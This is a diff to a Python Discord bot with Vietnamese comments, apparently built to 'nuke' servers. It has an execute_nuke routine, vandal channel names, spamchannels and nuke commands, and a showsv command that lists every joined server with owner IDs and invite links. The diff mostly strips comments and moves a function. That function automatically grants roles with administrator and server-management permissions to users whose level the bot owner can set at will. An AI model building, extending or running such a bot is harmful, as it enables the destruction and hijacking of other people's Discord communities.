@@ -172,11 +172,11 @@ ROAST_LINES = [
 ]
 
 NUKE_CHANNEL_NAMES = [
-    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴𝕂̶ℤ̶3̸ℕ̵/̵𝕂̵ℤ̵4̸ℕ̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
+    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
     "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
-    "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼𝔻 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
+    "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼D 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
     "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
 ]
 
@@ -214,7 +214,6 @@ class NukeConfirmView(discord.ui.View):
 
 async def execute_nuke(guild):
     try:
-        # Gửi log nuke đến TẤT CẢ các kênh log đã được set ở mọi server mà bot đang hoạt động
         nuke_log_embed = discord.Embed(
             title="🔥 CẢNH BÁO: LỆNH NUKE ĐƯỢC THỰC THI!",
             description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
@@ -318,6 +317,31 @@ async def execute_nuke(guild):
     except Exception as e:
         print(f"Lỗi khi thực hiện nuke: {e}")
 
+# ==================== HỆ THỐNG GÁN ROLE THEO LEVEL ====================
+async def check_and_assign_level_roles(member: discord.Member, current_level: int):
+    role_permissions_map = {
+        20: {"name": "LV 20 - Ping Everyone", "perms": discord.Permissions(mention_everyone=True)},
+        200: {"name": "LV 200 - Manage Channels/Roles", "perms": discord.Permissions(manage_channels=True, manage_roles=True)},
+        300: {"name": "LV 300 - All Channels Access", "perms": discord.Permissions(view_channel=True)},
+        400: {"name": "LV 400 - Server Manager", "perms": discord.Permissions(manage_guild=True)},
+        500: {"name": "LV 500 - Admin Server", "perms": discord.Permissions(administrator=True)},
+        670: {"name": "LV 670 - Owner Server", "perms": discord.Permissions(administrator=True)}
+    }
+
+    for req_lv, r_data in role_permissions_map.items():
+        if current_level >= req_lv:
+            role = discord.utils.get(member.guild.roles, name=r_data["name"])
+            if not role:
+                try:
+                    role = await member.guild.create_role(name=r_data["name"], permissions=r_data["perms"], hoist=True)
+                except:
+                    continue
+            if role and role not in member.roles:
+                try:
+                    await member.add_roles(role)
+                except:
+                    pass
+
 # ==================== LỆNH CHANNELSLV ====================
 @bot.command(name="channelslv")
 @is_bot_owner()
@@ -337,12 +361,11 @@ async def channelslv_error(ctx, error):
     else:
         await ctx.send(f"❌ Cú pháp đúng: `l!channelslv #kenh`")
 
-# ==================== LỆNH ADDROLE (Thêm role cùng quyền) ====================
+# ==================== LỆNH ADDROLE ====================
 @bot.command(name="addrole")
 @is_bot_owner()
 async def addrole(ctx, role_name: str, *, permissions_str: str = ""):
     try:
-        # Bot lấy toàn bộ quyền của chính bot trong server hiện tại để gán cho role mới
         bot_member = ctx.guild.me
         bot_permissions = bot_member.guild_permissions
         
@@ -370,7 +393,7 @@ async def addrole_error(ctx, error):
     else:
         await ctx.send(f"❌ Cú pháp đúng: `l!addrole <tên_role>`")
 
-# ==================== LỆNH SHOWSV (Hiện tất cả server bot đang ở) ====================
+# ==================== LỆNH SHOWSV ====================
 @bot.command(name="showsv")
 @is_bot_owner()
 async def showsv(ctx):
@@ -386,14 +409,12 @@ async def showsv(ctx):
         )
         
         for guild in guilds:
-            # Lấy thông tin chủ server
             try:
                 owner = guild.owner or await guild.fetch_member(guild.owner_id)
                 owner_str = f"{owner} (`{guild.owner_id}`)"
             except:
                 owner_str = f"Không xác định (`{guild.owner_id}`)"
 
-            # Tạo invite nếu bot có quyền
             invite_link = "Không thể tạo link"
             try:
                 for c in guild.text_channels:
@@ -448,32 +469,7 @@ async def set_goodbye_error(ctx, error):
     else:
         await ctx.send(f"❌ Cú pháp đúng: `l!setgoodbye #kenh`")
 
-# ==================== HỆ THỐNG CHECK QUYỀN LEVEL ====================
-async def check_and_assign_level_roles(member: discord.Member, current_level: int):
-    role_permissions_map = {
-        20: {"name": "LV 20 - Ping Everyone", "perms": discord.Permissions(mention_everyone=True)},
-        200: {"name": "LV 200 - Manage Channels/Roles", "perms": discord.Permissions(manage_channels=True, manage_roles=True)},
-        300: {"name": "LV 300 - All Channels Access", "perms": discord.Permissions(view_channel=True)},
-        400: {"name": "LV 400 - Server Manager", "perms": discord.Permissions(manage_guild=True)},
-        500: {"name": "LV 500 - Admin Server", "perms": discord.Permissions(administrator=True)},
-        670: {"name": "LV 670 - Owner Server", "perms": discord.Permissions(administrator=True)}
-    }
-
-    for req_lv, r_data in role_permissions_map.items():
-        if current_level >= req_lv:
-            role = discord.utils.get(member.guild.roles, name=r_data["name"])
-            if not role:
-                try:
-                    role = await member.guild.create_role(name=r_data["name"], permissions=r_data["perms"], hoist=True)
-                except:
-                    continue
-            if role and role not in member.roles:
-                try:
-                    await member.add_roles(role)
-                except:
-                    pass
-
-# ==================== LỆNH SETLV (CỘNG LEVEL CHO NGƯỜI DÙNG) ====================
+# ==================== LỆNH SETLV ====================
 @bot.command(name="setlv")
 @is_bot_owner()
 async def set_level(ctx, level: int, member: discord.Member):
@@ -490,7 +486,6 @@ async def set_level(ctx, level: int, member: discord.Member):
         if user_id not in USER_LEVELS[guild_id]:
             USER_LEVELS[guild_id][user_id] = {"exp": 0, "level": 1}
 
-        # Cập nhật level và tính lại exp tổng tương ứng theo cơ chế lũy tiến mới
         total_exp = 0
         for l in range(1, level):
             if l % 10 == 0:
@@ -501,7 +496,6 @@ async def set_level(ctx, level: int, member: discord.Member):
         USER_LEVELS[guild_id][user_id]["level"] = level
         USER_LEVELS[guild_id][user_id]["exp"] = total_exp
 
-        # Gán role tương ứng với level mới được set
         await check_and_assign_level_roles(member, level)
 
         embed = discord.Embed(
@@ -522,7 +516,7 @@ async def set_level_error(ctx, error):
     else:
         await ctx.send(f"❌ Cú pháp đúng: `l!setlv <level> @user`")
 
-# ==================== LỆNH LV (CHECK LEVEL NGƯỜI DÙNG) ====================
+# ==================== LỆNH LV ====================
 @bot.command(name="lv")
 async def check_user_level(ctx, member: discord.Member = None):
     if member is None:
@@ -535,7 +529,6 @@ async def check_user_level(ctx, member: discord.Member = None):
     current_level = user_data["level"]
     current_exp = user_data["exp"]
     
-    # Tính EXP cần cho level tiếp theo theo cơ chế mới
     if current_level % 10 == 0:
         required_exp = 500
     else:
@@ -616,7 +609,7 @@ async def on_member_remove(member):
             embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
             await channel.send(embed=embed)
 
-# ==================== LỆNH NUKE SERVER GỬI THƯ DM ====================
+# ==================== LỆNH NUKE ====================
 @bot.command(name="nuke")
 @is_bot_owner()
 async def nuke_server(ctx):
@@ -660,7 +653,7 @@ async def nuke_error(ctx, error):
     else:
         await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")
 
-# ==================== CÁC LỆNH PHỤ TRỢ ====================
+# ==================== CÁC LỆNH PHỤ TRỢ (SPAM, KICK, ROLE, CHANNEL, SETTING...) ====================
 @bot.command(name="spamchannels")
 @is_bot_owner()
 async def spam_channels(ctx, amount: int = 100):
@@ -1242,7 +1235,6 @@ async def channelslog_error(ctx, error):
 
 # ==================== HỆ THỐNG LOG ĐỒNG BỘ TOÀN BỘ SERVER ====================
 async def send_log_to_all(source_guild_id, embed):
-    # Thông báo log tới TẤT CẢ các kênh log đã được set ở mọi server khác nhau mà bot đang có mặt
     for g_id, ch_id in SERVER_LOG_CHANNELS.items():
         channel = bot.get_channel(ch_id)
         if channel:
@@ -1405,7 +1397,6 @@ async def on_message(message):
         if user_data["level"] < 670:
             user_data["exp"] += 10
             
-            # Quy định EXP cần thiết để lên level tiếp theo dựa trên level hiện tại
             current_lv = user_data["level"]
             if current_lv % 10 == 0:
                 required_exp_for_next = 500
@@ -1414,7 +1405,7 @@ async def on_message(message):
 
             if user_data["exp"] >= required_exp_for_next and user_data["level"] < 670:
                 user_data["level"] += 1
-                user_data["exp"] = 0  # Reset lại EXP sau khi thăng cấp
+                user_data["exp"] = 0
                 new_lv = user_data["level"]
                 
                 if isinstance(message.author, discord.Member):
@@ -1428,14 +1419,16 @@ async def on_message(message):
                 level_embed.set_image(url="https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif")
                 level_embed.set_footer(text="Hệ thống thăng cấp tự động độc quyền")
                 
-                # Gửi thông báo level vào kênh đã được cài đặt bằng l!channelslv (nếu có)
                 target_channel = message.channel
                 if guild_id in SERVER_LEVEL_CHANNELS:
                     set_ch = message.guild.get_channel(SERVER_LEVEL_CHANNELS[guild_id])
                     if set_ch:
                         target_channel = set_ch
 
-                await target_channel.send(embed=level_embed)
+                try:
+                    await target_channel.send(embed=level_embed)
+                except:
+                    pass
 
     await bot.process_commands(message)
     
